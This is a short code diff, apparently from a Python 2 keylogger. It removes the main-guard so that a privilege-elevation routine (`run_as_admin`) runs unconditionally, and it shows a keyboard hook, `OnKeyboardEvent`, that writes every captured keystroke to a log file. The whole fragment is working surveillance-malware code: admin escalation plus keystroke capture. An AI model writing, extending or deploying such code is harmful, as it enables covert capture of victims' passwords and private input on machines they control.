@@ -195,9 +195,7 @@ try:
         return False
       return None
 
-
-    if __name__ == '__main__':
-      ret = run_as_admin()
+    ret = run_as_admin()
     if ret is True:
         print 'I have admin privilege.'
         raw_input('Press ENTER to exit.')
@@ -206,7 +204,7 @@ try:
         raw_input('Press ENTER to exit.')
     else:
         print 'Error(ret=%d): cannot elevate privilege.' % (ret, )
-    
+        
     def OnKeyboardEvent(event):
       fob=open(log_file,"a")
       fob.write(event.Key)
